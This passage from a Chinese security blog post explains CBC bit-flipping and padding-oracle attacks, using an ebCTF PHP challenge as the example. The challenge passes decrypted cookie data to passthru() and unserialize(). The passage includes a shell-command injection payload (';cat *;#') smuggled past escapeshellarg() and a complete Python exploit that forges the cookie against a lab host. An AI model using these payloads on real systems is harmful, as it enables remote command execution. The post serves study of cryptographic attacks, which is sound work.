class="string">&#x27;MY_MAC_LEN&#x27;</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hmac</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha1&#x27;</span>, data, MY_HMAC_KEY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">aes</span>(<span class="variable">$data</span> . <span class="title function_ invoke__">hmac</span>(<span class="variable">$data</span>), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">aes</span>(<span class="variable">$data</span>, <span class="literal">false</span>), <span class="string">&quot;\0&quot;</span>);</span><br><span class="line"><span class="variable">$mac</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, -MY_MAC_LEN);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, -MY_MAC_LEN);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">hmac</span>(<span class="variable">$data</span>) === <span class="variable">$mac</span> ? <span class="variable">$data</span> : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$settings</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_COOKIE</span>[<span class="string">&#x27;settings&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;settings&#x27;</span>]));</span><br><span class="line"><span class="variable">$settings</span> = <span class="title function_ invoke__">unserialize</span>(@<span class="title function_ invoke__">decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;settings&#x27;</span>])));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &lt; <span class="number">200</span>) &#123;</span><br><span class="line"><span class="variable">$settings</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line"><span class="string">&#x27;greeting&#x27;</span> =&gt; (<span class="string">&#x27;echo &#x27;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_POST[&#x27;name&#x27;]&#125;</span>!&quot;</span>)),</span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;settings&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$settings</span>))));</span><br><span class="line"><span class="comment">#setcookie(&#x27;settings&#x27;, serialize($settings));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$settings</span>[<span class="string">&#x27;greeting&#x27;</span>]) &#123;</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$settings</span>[<span class="string">&#x27;greeting&#x27;</span>]);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;</span>\<span class="string">&quot;?\&quot;&quot;</span> method=<span class="string">&quot;\&quot;POST\&quot;&quot;</span>&gt;\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">echo &quot;</span></span><br><span class="line">What is your name?</span><br><span class="line"></span><br><span class="line">\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;input type=<span class="string">&quot;\&quot;text\&quot;&quot;</span> name=<span class="string">&quot;\&quot;name\&quot;&quot;</span> /&gt;\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;input type=<span class="string">&quot;\&quot;submit\&quot;&quot;</span> name=<span class="string">&quot;\&quot;submit\&quot;&quot;</span> value=<span class="string">&quot;\&quot;Submit\&quot;&quot;</span> /&gt;\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;/form&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中，在POST提交参数”name”的任何文本值之后，应用程序则会对应输出”Hello”加上最后提交的文本。但是有两件事情发生在消息打印之前：</p>
+<ol>
+<li>POST参数”name”值被PHP函数escapeshellarg()过滤（转换单引号，防止恶意命令注入），然后将其存储在Array-&gt;greeting当中，最后加密该值来产生cookie。</li>
+<li>Array-&gt;greeting当中的内容被PHP函数passthru()执行。</li>
+<li>最后，在页面被访问的任何时间中，如果cookie已经存在，它会被解密，它的内容会通过passthru()函数执行。如前节所述，在这里CBC攻击会给我们一个不同的明文。</li>
+</ol>
+<p>然后构造了一个POST”name”的值来注入字符串：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;X&#x27;</span> + <span class="string">&#x27;;cat *;#a&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先添加了一个字符”X”，通过CBC翻转攻击将其替换成一个单引号，</p>
+<p>然后 <code>;cat *;</code>命令将被执行，</p>
+<p>最后的 <code>#</code>是用来注释，确保函数escapeshellarg()插入的单引号不会引起其他问题；</p>
+<p>因此我们的命令就被成功执行。</p>
+<p>在计算好之前的密码块中，要被改变的字节的确切偏移量（51）后，通过下面的代码来注入单引号：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pos = <span class="number">51</span>;</span><br><span class="line">val = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;X&#x27;</span>) ^ <span class="title function_ invoke__">ord</span>(<span class="string">&quot;&#x27;&quot;</span>) ^ <span class="title function_ invoke__">ord</span>(cookie[pos]))</span><br><span class="line">exploit = cookie[<span class="number">0</span>:pos] + val + cookie[pos + <span class="number">1</span>:]</span><br></pre></td></tr></table></figure>
+
+<p>然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：</p>
+<p>[<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/a307d3d11ed50b0f3b36d6d031295be4adbb4b10.jpg" alt="img"></p>
+<p>首先，因为我们改变了第一块，</p>
+<p>所以在第二块中，黄色标记的”X”被成功替换为单引号，它被认为是多余插入（绿色），导致在unserialize()处理数据时产生一个错误（红色），</p>
+<p>因此应用程序甚至都没有去尝试执行注入了。</p>
+<p><strong>如何完善</strong></p>
+<p>我们需要使我们的注入数据有效，那么我们在第一块中得到的额外数据，就不能在反序列化的过程中造成任何问题（unserialize()）。</p>
+<p>一种方法是在我们的恶意命令中填充字母字符。因此我们尝试在注入字符串前后填充多个’z’：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;z&#x27;</span>*<span class="number">17</span> + <span class="string">&#x27;X&#x27;</span> + <span class="string">&#x27;;cat *;#&#x27;</span> + <span class="string">&#x27;z&#x27;</span>*<span class="number">16</span></span><br></pre></td></tr></table></figure>
+
+<p>在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行。</p>
+<p><strong>Exploit:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> dec</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> enc</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.184.133/ebctf/mine.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Test</span>(<span class="params">x</span>):</span><br><span class="line">    t = <span class="string">&quot;echo &#x27;Hello %s!&#x27;&quot;</span> % x</span><br><span class="line">    s = <span class="string">&#x27;a:2:&#123;s:4:&quot;name&quot;;s:%s:&quot;%s&quot;;s:8:&quot;greeting&quot;;s:%s:&quot;%s&quot;;&#125;%s&#x27;</span> % (<span class="built_in">len</span>(x),x,<span class="built_in">len</span>(t),t, <span class="string">&#x27;X&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">print</span> s[i:i+<span class="number">16</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pwn</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    s = urllib.quote_plus(enc(s))</span><br><span class="line">    req = requests.get(url, cookies = &#123;<span class="string">&#x27;settings&#x27;</span> : s&#125;).content</span><br><span class="line"> <span class="comment">#   if req.find(&#x27;works&#x27;) != -1:</span></span><br><span class="line">    <span class="built_in">print</span> req</span><br><span class="line">  <span class="comment">#  else:</span></span><br><span class="line">   <span class="comment">#     print &#x27;[-] FAIL&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetCookie</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    d = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>:name,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    h = requests.post(url, data = d, headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span> : <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;).headers</span><br><span class="line">    <span class="keyword">if</span> h.has_key(<span class="string">&#x27;set-cookie&#x27;</span>):</span><br><span class="line">        h = dec(urllib.unquote_plus(h[<span class="string">&#x27;set-cookie&#x27;</span>][<span class="number">9</span>:]))</span><br><span class="line">        <span class="comment">#h = urllib.unquote_plus(h[&#x27;set-cookie&#x27;][9:])</span></span><br><span class="line">        <span class="comment">#print h</span></span><br><span class="line">        <span class="keyword">return</span> h</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[-] ERROR&#x27;</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#a:2:&#123;s:4:&quot;name&quot;;s:10:&quot;X;cat *;#a&quot;;s:8:&quot;greeting&quot;;s:24:&quot;echo &#x27;Hello X;cat *;#a!&#x27;&quot;;&#125;</span></span><br><span class="line"><span class="comment">#a:2:&#123;s:4:&quot;name&quot;;</span></span><br><span class="line"><span class="comment">#s:10:&quot;X;cat *;#a</span></span><br><span class="line"><span class="comment">#&quot;;s:8:&quot;greeting&quot;</span></span><br><span class="line"><span class="comment">#;s:24:&quot;echo &#x27;Hel</span></span><br><span class="line"><span class="comment">#lo X;cat *;#a!&#x27;&quot;</span></span><br><span class="line"><span class="comment">#;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#a:2:&#123;s:4:&quot;name&quot;;s:42:&quot;zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz&quot;;s:8:&quot;greeting&quot;;s:56:&quot;echo &#x27;Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!&#x27;&quot;;&#125;</span></span><br><span class="line"><span class="comment">#a:2:&#123;s:4:&quot;name&quot;;</span></span><br><span class="line"><span class="comment">#s:42:&quot;zzzzzzzzzz</span></span><br><span class="line"><span class="comment">#zzzzzzzX;cat *;#</span></span><br><span class="line"><span class="comment">#zzzzzzzzzzzzzzzz</span></span><br><span class="line"><span class="comment">#&quot;;s:8:&quot;greeting&quot;   </span></span><br><span class="line"><span class="comment">#;s:56:&quot;echo &#x27;Hel</span></span><br><span class="line"><span class="comment">#lo zzzzzzzzzzzzz</span></span><br><span class="line"><span class="comment">#zzzzX;cat *;#zzz</span></span><br><span class="line"><span class="comment">#zzzzzzzzzzzzz!&#x27;&quot;</span></span><br><span class="line"><span class="comment">#;&#125;</span></span><br><span class="line"><span class="comment">#exploit = &#x27;X&#x27; + &#x27;;cat *;#a&#x27; #Test case first, unsuccess</span></span><br><span class="line">exploit = <span class="string">&#x27;z&#x27;</span>*<span class="number">17</span> + <span class="string">&#x27;X&#x27;</span> + <span class="string">&#x27;;cat *;#&#x27;</span> + <span class="string">&#x27;z&#x27;</span> *<span class="number">16</span> <span class="comment"># Test Success</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit = &quot;______________________________________________________; cat *;#&quot;</span></span><br><span class="line"><span class="comment">#Test(exploit)</span></span><br><span class="line">cookie = GetCookie(exploit)</span><br><span class="line">pos = <span class="number">100</span>; <span class="comment">#test case success</span></span><br><span class="line"><span class="comment">#pos = 51; #test case first, unsuccess</span></span><br><span class="line">val = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;X&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&quot;&#x27;&quot;</span>) ^ <span class="built_in">ord</span>(cookie[pos]))</span><br><span class="line">exploit = cookie[<span class="number">0</span>:pos] + val + cookie[pos + <span class="number">1</span>:]</span><br><span class="line">Pwn(exploit)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-参考"><a href="#0x09-参考" class="headerlink" title="0x09 参考"></a>0x09 参考</h2><p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/database/151167.html">Padding oracle attack详细解析</a><a target="_blank" rel="noopener" href="https://kuraraneko.github.io/2018/01/14/Padding-Orlace/">Padding Orlace</a><a target="_blank" rel="noopener" href="http://p0sec.net/index.php/archives/99/">CBC字节翻转攻击</a><a target="_blank" rel="noopener" href="https://wooyun.l0ki.top/#!/drops/707.CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach">wooyunCBC字节翻转攻击-101Approach</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2020/06/28/2020-5Space-CTF-Web/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-04-21 02:07:42
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Vulnerabilities/" title="Vulnerabilities">
+                        #Vulnerabilities
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2020/07/02/File-Parsing-Vulnerabilities/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC"><span class="toc-text">0x01 什么是CBC字节翻转</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%EF%BC%88XOR%EF%BC%89"><span class="toc-text">0x02 异或运算（XOR）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CBC%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F"><span class="toc-text">0x03 CBC加密模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%8A%A0%E5%AF%86%E5%85%AC%E5%BC%8F"><span class="toc-text">3.1 加密公式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-text">3.2 加密过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CBC%E8%A7%A3%E5%AF%86%E6%A8%A1%E5%BC%8F"><span class="toc-text">0x04 CBC解密模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E8%A7%A3%E5%AF%86%E5%85%AC%E5%BC%8F"><span class="toc-text">4.1 解密公式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-text">4.2 解密过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB"><span class="toc-text">0x05 CBC字节翻转攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">5.1 攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-POC"><span class="toc-text">5.2 POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E4%B8%80%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-text">5.3 一个例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-padding-oracle%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">0x06 padding oracle攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%A6%82%E8%A6%81"><span class="toc-text">6.1 概要</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E8%AF%A6%E8%A7%A3"><span class="toc-text">6.2 详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%A4%E6%96%AD%E8%BF%87%E7%A8%8B"><span class="toc-text">6.3 服务器判断过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-padding-oracle-attack%E6%A0%B8%E5%BF%83"><span class="toc-text">6.4 padding oracle attack核心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-%E6%94%BB%E5%87%BB%E6%88%90%E7%AB%8B%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text">6.5 攻击成立的条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E8%BF%90%E7%94%A8-%E5%8F%82%E8%80%83"><span class="toc-text">0x07 运用(参考)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E7%BB%83%E4%B9%A0"><span class="toc-text">0x08 练习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-%E5%8F%82%E8%80%83"><span class="toc-text">0x09 参考</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/L0kiii">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2024
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
